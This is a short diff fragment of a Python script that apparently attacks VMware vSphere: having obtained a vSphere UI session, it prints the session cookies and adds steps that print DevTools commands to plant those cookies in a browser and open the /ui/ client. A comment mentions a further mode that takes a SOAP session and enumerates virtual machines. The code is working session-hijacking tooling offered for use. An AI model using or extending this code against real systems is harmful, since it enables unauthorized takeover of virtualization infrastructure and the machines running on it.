@@ -2039,12 +2039,18 @@ def main():
 
         print(f'\n[+] https://{target}/ui/')
         print(f'    {cname}={cval}')
+        all_cookies = {cname: cval}
         for extra in ('VSPHERE-CLIENT-SESSION-INDEX', 'VSPHERE-USERNAME'):
             v = ui_session.cookies.get(extra)
             if v:
                 print(f'    {extra}={v}')
+                all_cookies[extra] = v
 
         if choice == '1':
+            print(f'\n[*] Browser injection — navigate to https://{target}/sdk first, then run in DevTools console:')
+            for k, v in all_cookies.items():
+                print(f'    document.cookie="{k}={v}; path=/ui; Secure; SameSite=Lax";')
+            print(f"    location.href='https://{target}/ui/';")
             return
 
         # choice == '2' — get VIM SOAP session and enumerate VMs
